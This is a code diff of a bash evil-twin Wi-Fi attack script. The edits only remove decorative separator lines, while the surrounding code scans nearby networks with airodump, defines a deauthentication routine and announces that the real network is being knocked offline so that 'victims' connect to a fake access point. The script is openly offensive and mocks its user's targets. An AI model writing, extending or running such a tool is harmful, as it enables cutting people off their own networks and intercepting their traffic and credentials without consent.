@@ -64,7 +64,6 @@ scan_networks() {
     kill $AIRODUMP_PID 2>/dev/null
     wait $AIRODUMP_PID 2>/dev/null
     echo -e "\n${GREEN}[*] Available networks (BSSID - ESSID):${NC}"
-    echo "=========================================="
     if [ -f "/tmp/scan-01.csv" ]; then
         tail -n +2 /tmp/scan-01.csv | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | \
         awk -F',' '{printf "%-20s - %s\n", $1, $14}' | sort | uniq | head -20
@@ -73,7 +72,6 @@ scan_networks() {
         echo -e "${YELLOW}[*] Try moving closer to targets, dumbass!${NC}"
         exit 1
     fi
-    echo "=========================================="
 }
 deauth_network() {
     local target_bssid="$1"
@@ -244,13 +242,11 @@ case $MODE in
         page_mode
         ;;
 esac
-echo -e "\n${RED}════════════════════════════════════════════════════════════${NC}"
 echo -e "${GREEN}[✓] EVIL TWIN ATTACK DEPLOYED SUCCESSFULLY!${NC}"
 echo -e "${YELLOW}[*] Fake network: ${TARGET_ESSID}${NC}"
 echo -e "${YELLOW}[*] Real network being deauthenticated${NC}"
 echo -e "${YELLOW}[*] Victims will connect to YOUR fake network${NC}"
 echo -e "${RED}[!] Press Ctrl+C to stop this beautiful madness${NC}"
-echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
 while true; do
     sleep 3600
 done
